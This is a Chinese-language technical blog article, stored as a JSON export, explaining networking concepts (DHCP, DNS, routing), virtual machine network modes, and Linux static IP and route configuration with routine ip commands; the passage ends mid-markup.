{"title":"网络管理","uid":"211ca85a2e196056b84f487853fdec80","slug":"网络管理","date":"2025-08-07T02:21:43.000Z","updated":"2025-08-07T09:37:38.759Z","comments":true,"path":"api/articles/网络管理.json","keywords":null,"cover":[],"content":"<h1 id=\"网络管理\"><a href=\"#网络管理\" class=\"headerlink\" title=\"网络管理\"></a>网络管理</h1><h2 id=\"一、基本概念\"><a href=\"#一、基本概念\" class=\"headerlink\" title=\"一、基本概念\"></a>一、基本概念</h2><h3 id=\"1、物理网卡（NIC-Network-Interface-Card）\"><a href=\"#1、物理网卡（NIC-Network-Interface-Card）\" class=\"headerlink\" title=\"1、物理网卡（NIC, Network Interface Card）\"></a>1、物理网卡（NIC, Network Interface Card）</h3><p>​\t<strong>硬件实体</strong>：插在主板或扩展槽上的设备（如 Intel千兆网卡、Realtek 无线网卡）。</p>\n<p>​\t功能：</p>\n<p>​\t\t负责物理层（PHY）信号传输（如电信号、光信号）。</p>\n<p>​\t\t支持数据链路层（MAC 地址、帧封装）的基础操作。</p>\n<h3 id=\"2、网络适配器（Adapter）\"><a href=\"#2、网络适配器（Adapter）\" class=\"headerlink\" title=\"2、网络适配器（Adapter）\"></a>2、网络适配器（Adapter）</h3><p>​\t<strong>软件抽象</strong>：Windows 系统中驱动程序与服务的集合，管理网卡硬件。</p>\n<p>​\t功能：</p>\n<p>​\t\t加载网卡驱动，提供 API 接口供操作系统调用。</p>\n<p>​\t\t处理网络协议（如 TCP&#x2F;IP）、虚拟化支持（如 Hyper-V 的虚拟网卡）。</p>\n<p>​\t\t在设备管理器中显示为“网络适配器”条目。</p>\n<h3 id=\"3、DHCP（Dynamic-Host-Configuration-Protocol）动态主机配置协议\"><a href=\"#3、DHCP（Dynamic-Host-Configuration-Protocol）动态主机配置协议\" class=\"headerlink\" title=\"3、DHCP（Dynamic Host Configuration Protocol）动态主机配置协议\"></a>3、DHCP（Dynamic Host Configuration Protocol）动态主机配置协议</h3><h4 id=\"1-核心功能\"><a href=\"#1-核心功能\" class=\"headerlink\" title=\"1.核心功能\"></a>1.核心功能</h4><p>​\t<strong>自动分配 IP 地址</strong>：在局域网内自动为设备分配 IP&#x2F;MAC 绑定信息（如 192.168.1.100 ）。</p>\n<p>​\t<strong>配置同步</strong>：自动设置子网掩码、网关、DNS 服务器等参数。</p>\n<p>​\t<strong>租约管理</strong>：IP 地址租用期限（如 86400 秒），到期后自动续租或回收。</p>\n<h4 id=\"2-典型应用场景\"><a href=\"#2-典型应用场景\" class=\"headerlink\" title=\"2.典型应用场景\"></a>2.典型应用场景</h4><p>​\t<strong>动态网络</strong>：办公室、家庭 Wi-Fi，设备频繁变动（如手机、平板接入）。</p>\n<p>​\t<strong>虚拟化环境</strong>：VMware&#x2F;Kubernetes 中的虚拟机自动获取 IP。</p>\n<p>​\t<strong>服务部署</strong>：快速部署临时服务器，无需手动配置 IP。</p>\n<h3 id=\"4、静态地址（Static-IP-Address）\"><a href=\"#4、静态地址（Static-IP-Address）\" class=\"headerlink\" title=\"4、静态地址（Static IP Address）\"></a>4、静态地址（Static IP Address）</h3><h4 id=\"1-核心特征\"><a href=\"#1-核心特征\" class=\"headerlink\" title=\"1.核心特征\"></a>1.核心特征</h4><p>​\t<strong>手动配置</strong>：固定 IP 地址（如 192.168.1.100 ），不会因网络变化而改变。</p>\n<p>​\t<strong>高稳定性</strong>：适用于需要长期稳定访问的服务（如 Web 服务器、数据库）。</p>\n<h4 id=\"2-典型应用场景-1\"><a href=\"#2-典型应用场景-1\" class=\"headerlink\" title=\"2.典型应用场景\"></a>2.典型应用场景</h4><p>​\t<strong>生产服务器</strong>：确保外部用户始终通过固定 IP 访问服务。</p>\n<p>​\t<strong>网络设备</strong>：路由器、防火墙等需要固定 IP 的设备。</p>\n<p>​\t<strong>内网穿透</strong>：在 NAT 环境中，为特定服务分配静态内网 IP。</p>\n<h3 id=\"5、DNS（Domain-Name-System）域名系统\"><a href=\"#5、DNS（Domain-Name-System）域名系统\" class=\"headerlink\" title=\"5、DNS（Domain Name System）域名系统\"></a>5、DNS（Domain Name System）域名系统</h3><h4 id=\"1-核心功能-1\"><a href=\"#1-核心功能-1\" class=\"headerlink\" title=\"1.核心功能\"></a>1.核心功能</h4><p>​\t<strong>域名解析</strong>：将人类可读的域名（如 google.com ）转换为 IP 地址（如 &#96;172.217.14.104）。</p>\n<p>​\t支持正向&#x2F;反向解析：</p>\n<p>​\t\t正向解析：域名 → IP</p>\n<p>​\t\t反向解析：IP → 域名</p>\n<h4 id=\"2-典型应用场景-2\"><a href=\"#2-典型应用场景-2\" class=\"headerlink\" title=\"2.典型应用场景\"></a>2.典型应用场景</h4><p>​\t<strong>访问互联网服务</strong>：浏览器、邮件客户端依赖 DNS 解析域名。</p>\n<p>​\t<strong>内部网络管理</strong>：企业内网域名解析（如 mail.example.com ）。</p>\n<p>​\t<strong>负载均衡</strong>：通过 DNS 轮询实现流量分发。</p>\n<h3 id=\"6、linux中常见网络接口类型及缩写标识解析\"><a href=\"#6、linux中常见网络接口类型及缩写标识解析\" class=\"headerlink\" title=\"6、linux中常见网络接口类型及缩写标识解析\"></a>6、linux中常见网络接口类型及缩写标识解析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807145608502.png\" alt=\"image-20250807145608502\"></p>\n<h3 id=\"7、Windows-中的“网络适配器”分类\"><a href=\"#7、Windows-中的“网络适配器”分类\" class=\"headerlink\" title=\"7、Windows 中的“网络适配器”分类\"></a>7、Windows 中的“网络适配器”分类</h3><p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807145640697.png\" alt=\"image-20250807145640697\"></p>\n<h3 id=\"8、路由转发\"><a href=\"#8、路由转发\" class=\"headerlink\" title=\"8、路由转发\"></a>8、路由转发</h3><p>路由转发（IP Forwarding）是计算机网络中的核心机制，指 路由器或具备路由功能的设备根据路由表 将接收到的数据包转发到目标网络。以下是详细解析：</p>\n<h4 id=\"1-核心概念\"><a href=\"#1-核心概念\" class=\"headerlink\" title=\"1.核心概念\"></a>1.核心概念</h4><p>​\t<strong>路由表（Routing Table）</strong>：  </p>\n<p>​\t存储网络地址与下一跳信息的表格，决定数据包的转发路径。 </p>\n<p>​\t<strong>示例条目</strong>：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">目标网络      下一跳IP      接口      标记</span><br><span class=\"line\">192.168.1.0/24  10.0.0.1  eth0      UG</span><br></pre></td></tr></table></figure>\n\n<p>​\t<strong>下一跳（Next Hop）</strong>： </p>\n<p>​\t数据包转发的下一个设备或网关的 IP 地址。 </p>\n<p>​\t<strong>路由协议（如 OSPF、BGP）</strong>：  </p>\n<p>​\t动态更新路由表的协议，适用于大型网络（如企业网或互联网）。</p>\n<h4 id=\"2-路由转发的工作流程\"><a href=\"#2-路由转发的工作流程\" class=\"headerlink\" title=\"2.路由转发的工作流程\"></a>2.路由转发的工作流程</h4><h5 id=\"（1）接收数据包：\"><a href=\"#（1）接收数据包：\" class=\"headerlink\" title=\"（1）接收数据包：\"></a>（1）接收数据包：</h5><p>​\t\t设备收到来自本地网络的数据包（如 192.168.1.5 → 8.8.8.8 ）。</p>\n<h5 id=\"（2）路由表查询：\"><a href=\"#（2）路由表查询：\" class=\"headerlink\" title=\"（2）路由表查询：\"></a>（2）路由表查询：</h5><p>​\t\t检查目标地址 8.8.8.8 是否属于本地网络。</p>\n<p>​\t\t\t<strong>若是</strong>：直接交付给目标主机。</p>\n<p>​\t\t\t<strong>若否</strong>：查找路由表中匹配的条目。</p>\n<h5 id=\"（3）数据包转发：\"><a href=\"#（3）数据包转发：\" class=\"headerlink\" title=\"（3）数据包转发：\"></a>（3）数据包转发：</h5><p>​\t\t修改数据包的 TTL（生存时间） 和 校验和。</p>\n<p>​\t\t将数据包发送到下一跳设备（如网关 10.0.0.1 ）。</p>\n<h5 id=\"（4）递归转发：\"><a href=\"#（4）递归转发：\" class=\"headerlink\" title=\"（4）递归转发：\"></a>（4）递归转发：</h5><p>​\t\t下一跳设备重复上述过程，直至数据包到达最终目的地</p>\n<h4 id=\"3-路由转发的关键场景\"><a href=\"#3-路由转发的关键场景\" class=\"headerlink\" title=\"3.路由转发的关键场景\"></a>3.路由转发的关键场景</h4><h5 id=\"（1）内部网络访问外部网络\"><a href=\"#（1）内部网络访问外部网络\" class=\"headerlink\" title=\"（1）内部网络访问外部网络\"></a>（1）内部网络访问外部网络</h5><p>​\t<strong>场景</strong>：公司内网（192.168.1.0&#x2F;24 ）通过路由器（10.0.0.1 ）访问互联网（ 8.8.8.8 ）。</p>\n<p>​\t路由表配置：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 添加默认网关（互联网出口）</span></span><br><span class=\"line\"><span class=\"built_in\">sudo</span> ip route add default via 10.0.0.1 dev eth0</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"（2）数据中心流量调度\"><a href=\"#（2）数据中心流量调度\" class=\"headerlink\" title=\"（2）数据中心流量调度\"></a>（2）数据中心流量调度</h5><p>​\t<strong>场景</strong>：多个服务器（10.0.1.1、10.0.1.2 ）通过负载均衡器（10.0.0.1 ）分发流量。</p>\n<p>​\t路由策略：基于流量权重或服务器状态动态选择下一跳。</p>\n<h5 id=\"（3）VPN-隧道\"><a href=\"#（3）VPN-隧道\" class=\"headerlink\" title=\"（3）VPN 隧道\"></a>（3）VPN 隧道</h5><p>​\t<strong>场景</strong>：远程办公用户通过 VPN 隧道（如 172.16.0.0&#x2F;16 ）访问公司内网。</p>\n<p>​\t路由表配置：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 添加 VPN 路径</span></span><br><span class=\"line\"><span class=\"built_in\">sudo</span> ip route add 172.16.0.0/16 via 10.0.0.1 dev tun0</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"4-路由转发的配置方法\"><a href=\"#4-路由转发的配置方法\" class=\"headerlink\" title=\"4.路由转发的配置方法\"></a>4.路由转发的配置方法</h4><h5 id=\"（1）Linux-系统（使用-ip-命令）\"><a href=\"#（1）Linux-系统（使用-ip-命令）\" class=\"headerlink\" title=\"（1）Linux 系统（使用 ip 命令）\"></a>（1）Linux 系统（使用 ip 命令）</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看路由表</span></span><br><span class=\"line\">ip route show</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 添加静态路由（目标网络→下一跳→接口）</span></span><br><span class=\"line\"><span class=\"built_in\">sudo</span> ip route add 192.168.2.0/24 via 10.0.0.2 dev eth1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 删除路由</span></span><br><span class=\"line\"><span class=\"built_in\">sudo</span> ip route del 192.168.2.0/24</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"（2）-配置文件持久化\"><a href=\"#（2）-配置文件持久化\" class=\"headerlink\" title=\"（2） 配置文件持久化\"></a>（2） 配置文件持久化</h5><p>​\t<strong>路径</strong>： <code>/etc/sysconfig/network-scripts/route-eth0</code> （针对接口 <code>eth0</code>  </p>\n<p>​\t&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ensxxx </p>\n<p>​\t示例内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">to default via 10.0.0.1 dev eth0</span><br><span class=\"line\">to 192.168.2.0/24 via 10.0.0.2 dev eth1</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、虚拟机的网络连接方式\"><a href=\"#二、虚拟机的网络连接方式\" class=\"headerlink\" title=\"二、虚拟机的网络连接方式\"></a>二、虚拟机的网络连接方式</h2><h3 id=\"1、NAT（-网络地址转换）\"><a href=\"#1、NAT（-网络地址转换）\" class=\"headerlink\" title=\"1、NAT（ 网络地址转换）\"></a>1、NAT（ 网络地址转换）</h3><p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807151118441.png\" alt=\"image-20250807151118441\"></p>\n<h4 id=\"工作原理\"><a href=\"#工作原理\" class=\"headerlink\" title=\"工作原理\"></a>工作原理</h4><p>​\tNAT模式（网络地址转换模式，Network Address Translation）允许虚拟机通过主机访问外部网络（如互联网），但外部网络无法直接访问虚拟机。其工作原理主要是通过主机充当虚拟机的“网关”来实现网络地址转换。</p>\n<h4 id=\"1-虚拟机的私有网络：\"><a href=\"#1-虚拟机的私有网络：\" class=\"headerlink\" title=\"1.虚拟机的私有网络：\"></a>1.虚拟机的私有网络：</h4><p>​\t在 NAT 模式下，虚拟机会被分配一个私有 IP 地址（如 192.168.x.x 或 10.x.x.x），这个 IP 地址只能在虚拟机和主机之间有效，并且与外部网络隔离。</p>\n<h4 id=\"2-虚拟机请求外部网络：\"><a href=\"#2-虚拟机请求外部网络：\" class=\"headerlink\" title=\"2.虚拟机请求外部网络：\"></a>2.虚拟机请求外部网络：</h4><p>​\t当虚拟机需要访问外部网络（如互联网）时，它会把数据包通过虚拟网卡发送给主机。</p>\n<p>​\t数据包的源 IP 地址是虚拟机的私有 IP 地址，而目标地址是外部网络的某个设备（例如某个网站的服务器 IP）。</p>\n<h4 id=\"3-主机进行-NAT-转换：\"><a href=\"#3-主机进行-NAT-转换：\" class=\"headerlink\" title=\"3.主机进行 NAT 转换：\"></a>3.主机进行 NAT 转换：</h4><p>​\t主机充当，NAT 路由器，将来自虚拟机的数据包进行，网络地址转换。      </p>\n<p>​\t\t将数据包中的源 IP 地址从虚拟机的私有 IP 地址转换为主机的公网 IP 地址。</p>\n<p>​\t\t保留虚拟机的端口信息，以便将返回数据正确转发给虚拟机。</p>\n<h4 id=\"4-数据包发送至外部网络：\"><a href=\"#4-数据包发送至外部网络：\" class=\"headerlink\" title=\"4.数据包发送至外部网络：\"></a>4.数据包发送至外部网络：</h4><p>​\t主机将已经替换源 IP 的数据包发送到外部网络（例如互联网）。</p>\n<p>​\t外部服务器只看到数据包的源地址为主机的公网 IP，而不知道虚拟机的私有 IP。</p>\n<h4 id=\"5-外部网络响应数据：\"><a href=\"#5-外部网络响应数据：\" class=\"headerlink\" title=\"5.外部网络响应数据：\"></a>5.外部网络响应数据：</h4><p>​\t外部服务器将响应数据包发送回主机的公网 IP。</p>\n<p>​\t主机接收到响应后，使用 NAT 表将数据包中的目标 IP 地址重新转换回虚拟机的私有 IP 地址。</p>\n<h4 id=\"6-主机将数据包转发给虚拟机：\"><a href=\"#6-主机将数据包转发给虚拟机：\" class=\"headerlink\" title=\"6.主机将数据包转发给虚拟机：\"></a>6.主机将数据包转发给虚拟机：</h4><p>​\t主机将响应数据包转发给对应的虚拟机，虚拟机接收到外部网络的数据包后完成通信。</p>\n<p>​\t\tNAT模式下，主机是虚拟的路由器，而虚拟机是一台私有网络中的机器。而既然是私有网络中的机器，那就和私有网络IP地址有关</p>\n<h3 id=\"2、桥接模式（独立主机）\"><a href=\"#2、桥接模式（独立主机）\" class=\"headerlink\" title=\"2、桥接模式（独立主机）\"></a>2、桥接模式（独立主机）</h3><p>桥接模式允许虚拟机与主机网络以及外部网络完全独立地通信，虚拟机就像是网络中的一台独立主机， 具有自己的 IP 地址。</p>\n<h4 id=\"工作原理-1\"><a href=\"#工作原理-1\" class=\"headerlink\" title=\"工作原理\"></a>工作原理</h4><h4 id=\"1-网络连接：\"><a href=\"#1-网络连接：\" class=\"headerlink\" title=\"1.网络连接：\"></a>1.网络连接：</h4><p>​\t在桥接模式下，虚拟机的网络适配器与主机的物理网卡（例如以太网适配器或无线适配器）相连 接。这种连接模拟了虚拟机与局域网中的一台独立设备直接相连的情况。 </p>\n<h4 id=\"2-获取-IP-地址：\"><a href=\"#2-获取-IP-地址：\" class=\"headerlink\" title=\"2.获取 IP 地址：\"></a>2.获取 IP 地址：</h4><p>​\t虚拟机启动后，会通过 DHCP（动态主机配置协议）从网络中的 DHCP 服务器获取一个 独立的 IP  地址。这个 IP 地址与局域网中的其他设备位于同一子网内，确保虚拟机可以与其他设备直接通 信。 </p>\n<h4 id=\"3-数据链路层通信：\"><a href=\"#3-数据链路层通信：\" class=\"headerlink\" title=\"3.数据链路层通信：\"></a>3.数据链路层通信：</h4><p>​\t虚拟机和其他网络设备之间的通信是在数据链路层（Layer 2）进行的。虚拟机使用 MAC 地址进行 识别和通信。 </p>\n<p>​\t当虚拟机发送数据包时，它会将数据包发送到主机的物理网卡。由于虚拟机的网络适配器与主机的 网卡桥接，数据包将直接转发到局域网。</p>\n<h3 id=\"3、主机模式（子主机）\"><a href=\"#3、主机模式（子主机）\" class=\"headerlink\" title=\"3、主机模式（子主机）\"></a>3、主机模式（子主机）</h3><p>主机模式将虚拟机完全隔离在主机的网络中，虚拟机只能与主机通信，无法访问外部网络，也无法与其 他局域网设备通信。</p>\n<h4 id=\"工作原理-2\"><a href=\"#工作原理-2\" class=\"headerlink\" title=\"工作原理\"></a>工作原理</h4><h4 id=\"1-虚拟网络适配器：\"><a href=\"#1-虚拟网络适配器：\" class=\"headerlink\" title=\"1.虚拟网络适配器：\"></a>1.虚拟网络适配器：</h4><p>​\t在主机模式下，虚拟机通过一个虚拟网络适配器与主机进行连接。这个虚拟适配器形成了一个独立 的局域网，仅包含主机和虚拟机，完全隔离于外部网络。 </p>\n<h4 id=\"2-IP-地址分配：\"><a href=\"#2-IP-地址分配：\" class=\"headerlink\" title=\"2.IP 地址分配：\"></a>2.IP 地址分配：</h4><p>​\t主机和虚拟机在这个私有网络中都有各自的 IP 地址。主机的虚拟网络适配器通常会为虚拟机分配 一个私有 IP 地址（ 例如 192.168.x.x ）。这个 IP 地址只在主机和虚拟机之间有效，外部网络无法 访问。 </p>\n<h4 id=\"3-数据传输：\"><a href=\"#3-数据传输：\" class=\"headerlink\" title=\"3.数据传输：\"></a>3.数据传输：</h4><p>​\t当虚拟机需要与主机通信时，它通过虚拟网络适配器发送数据包。这些数据包只在主机和虚拟机之 间进行转发。 </p>\n<p>​\t主机和虚拟机之间的通信是在数据链路层（Layer 2）进行的，使用 MAC 地址进行识别和处理。</p>\n<h2 id=\"三、网络配置\"><a href=\"#三、网络配置\" class=\"headerlink\" title=\"三、网络配置\"></a>三、网络配置</h2><h3 id=\"1、网络服务-网络管理器（NetworkManager）\"><a href=\"#1、网络服务-网络管理器（NetworkManager）\" class=\"headerlink\" title=\"1、网络服务-网络管理器（NetworkManager）\"></a>1、网络服务-网络管理器（NetworkManager）</h3><p>网络管理器（NetworkManager）是一个动态网络的控制器与配置系统，它用于当网络设备可用时保持设备和连接开启并激活 </p>\n<p>默认情况下，CentOS8 已安装网络管理器，并处于启用状态。</p>\n<p>​\t查看网络管理程序的状态</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl status NetworkManager</span><br></pre></td></tr></table></figure>\n\n<p>​\t查看网络子管理程序的状态</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl status network   老版（centos 6之前）</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2、配置网络的方法\"><a href=\"#2、配置网络的方法\" class=\"headerlink\" title=\"2、配置网络的方法\"></a>2、配置网络的方法</h3><h4 id=\"配置文件：vim\"><a href=\"#配置文件：vim\" class=\"headerlink\" title=\"配置文件：vim\"></a>配置文件：vim</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost ~]# vim /etc/sysconfig/network-scripts/ifcfg-ens160</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"命令行：-nmcli\"><a href=\"#命令行：-nmcli\" class=\"headerlink\" title=\"命令行： nmcli\"></a>命令行： nmcli</h4><p>​\t如果没有这个命令，可以执行安装 yum -y install NetworkManager </p>\n<h4 id=\"图形配置\"><a href=\"#图形配置\" class=\"headerlink\" title=\"图形配置\"></a>图形配置</h4><p>​\t简易图形： nmtui </p>\n<p>​\t图形界面：nm-connection-editor</p>\n<h3 id=\"3、配置网络参数\"><a href=\"#3、配置网络参数\" class=\"headerlink\" title=\"3、配置网络参数\"></a>3、配置网络参数</h3><p><strong>实验：将虚拟机网卡设置为桥接模式，配置静态地址后能够访问外网</strong> </p>\n<h4 id=\"1-纯命令行配置静态-IP（无需依赖-NetworkManager-或-systemd-networkd-，重启失效）\"><a href=\"#1-纯命令行配置静态-IP（无需依赖-NetworkManager-或-systemd-networkd-，重启失效）\" class=\"headerlink\" title=\"1.纯命令行配置静态 IP（无需依赖 NetworkManager 或  systemd-networkd ，重启失效）\"></a>1.纯命令行配置静态 IP（无需依赖 NetworkManager 或  systemd-networkd ，重启失效）</h4><h5 id=\"（1）查看当前网络状态\"><a href=\"#（1）查看当前网络状态\" class=\"headerlink\" title=\"（1）查看当前网络状态\"></a>（1）查看当前网络状态</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf ~]# ip addr                     </span><br><span class=\"line\">NetworkManager 或 </span><br><span class=\"line\">systemd-networkd ，重启失效） </span><br><span class=\"line\"><span class=\"comment\"># 查看 IP、子网、网关等信息</span></span><br><span class=\"line\">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group </span><br><span class=\"line\">default qlen 1000</span><br><span class=\"line\"><span class=\"built_in\">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class=\"line\">inet 127.0.0.1/8 scope host lo</span><br><span class=\"line\">valid_lft forever preferred_lft forever</span><br><span class=\"line\">inet6 ::1/128 scope host </span><br><span class=\"line\">valid_lft forever preferred_lft forever</span><br><span class=\"line\">2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group </span><br><span class=\"line\">default qlen 1000</span><br><span class=\"line\"><span class=\"built_in\">link</span>/ether 00:0c:29:5c:a4:ed brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">inet 192.168.119.128/24 brd 192.168.119.255 scope global dynamic </span><br><span class=\"line\">noprefixroute ens160</span><br><span class=\"line\">valid_lft 1522sec preferred_lft 1522sec</span><br><span class=\"line\">inet6 fe80::ac23:8439:4329:9fe2/64 scope <span class=\"built_in\">link</span> noprefixroute </span><br><span class=\"line\">valid_lft forever preferred_lft forever</span><br><span class=\"line\">3: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group </span><br><span class=\"line\">default qlen 1000</span><br><span class=\"line\"><span class=\"built_in\">link</span>/ether 00:0c:29:5c:a4:f7 brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">inet 192.168.1.23/24 brd 192.168.1.255 scope global dynamic noprefixroute </span><br><span class=\"line\">ens192</span><br><span class=\"line\">valid_lft 258922sec preferred_lft 258922sec</span><br><span class=\"line\">inet6 fe80::4d93:c232:2460:e4f3/64 scope <span class=\"built_in\">link</span> noprefixroute </span><br><span class=\"line\">valid_lft forever preferred_lft forever</span><br><span class=\"line\">[root@wyf ~]# ip route                    </span><br><span class=\"line\"><span class=\"comment\"># 查看路由表</span></span><br><span class=\"line\">default via 192.168.119.2 dev ens160 proto dhcp metric 100 </span><br><span class=\"line\">default via 192.168.1.1 dev ens192 proto dhcp metric 101 </span><br><span class=\"line\">192.168.1.0/24 dev ens192 proto kernel scope <span class=\"built_in\">link</span> src 192.168.1.23 metric 101 </span><br><span class=\"line\">192.168.119.0/24 dev ens160 proto kernel scope <span class=\"built_in\">link</span> src 192.168.119.128 metric </span><br><span class=\"line\">100 </span><br><span class=\"line\"><span class=\"comment\">#ens160 的网关 192.168.119.2 是 NAT 模式下的宿主机网关。</span></span><br><span class=\"line\"><span class=\"comment\">#ens192 的网关 192.168.1.1 是桥接模式下的宿主机网关</span></span><br><span class=\"line\">[root@wyf ~]# <span class=\"built_in\">cat</span> /etc/resolv.conf       </span><br><span class=\"line\"><span class=\"comment\"># 查看 DNS 配置</span></span><br><span class=\"line\"><span class=\"comment\"># Generated by NetworkManager</span></span><br><span class=\"line\">nameserver 114.114.114.114</span><br><span class=\"line\">nameserver 192.168.1.1</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"（2）手动分配静态-IP\"><a href=\"#（2）手动分配静态-IP\" class=\"headerlink\" title=\"（2）手动分配静态 IP\"></a>（2）手动分配静态 IP</h5><p>​\t查看物理机 IP ，确保虚拟机和物理机处于同一网段</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf ~]# ip addr add 192.168.1.100/24 dev ens192  <span class=\"comment\"># 分配静态 IP + 子网掩码</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t验证：ping 物理机地址</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf ~]# ip addr show ens192 |grep 192.168.1.100</span><br><span class=\"line\">inet 192.168.1.100/24 scope global secondary ens192  <span class=\"comment\"># 确认 IP 已分配</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"（3）设置默认网关\"><a href=\"#（3）设置默认网关\" class=\"headerlink\" title=\"（3）设置默认网关\"></a>（3）设置默认网关</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf ~]# ip route add default via 192.168.1.1 dev ens192  <span class=\"comment\"># 添加默认路由</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t验证：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf ~]# ping -c4 8.8.8.8                        <span class=\"comment\">#谷歌的dns  </span></span><br><span class=\"line\">PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.</span><br><span class=\"line\">64 bytes from 8.8.8.8: icmp_seq=1 ttl=53 <span class=\"keyword\">time</span>=127 ms</span><br><span class=\"line\">64 bytes from 8.8.8.8: icmp_seq=2 ttl=53 <span class=\"keyword\">time</span>=50.7 ms</span><br><span class=\"line\">64 bytes from 8.8.8.8: icmp_seq=3 ttl=53 <span class=\"keyword\">time</span>=50.0 ms</span><br><span class=\"line\">64 bytes from 8.8.8.8: icmp_seq=4 ttl=53 <span class=\"keyword\">time</span>=50.7 ms</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"（4）-配置-DNS-服务器\"><a href=\"#（4）-配置-DNS-服务器\" class=\"headerlink\" title=\"（4） 配置 DNS 服务器\"></a>（4） 配置 DNS 服务器</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf ~]# vim /etc/resolv.conf </span><br><span class=\"line\"><span class=\"comment\"># Generated by NetworkManager</span></span><br><span class=\"line\"><span class=\"comment\"># nameserver 192.168.1.1</span></span><br><span class=\"line\">nameserver 114.114.114.114</span><br></pre></td></tr></table></figure>\n\n<p>​\t验证：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span 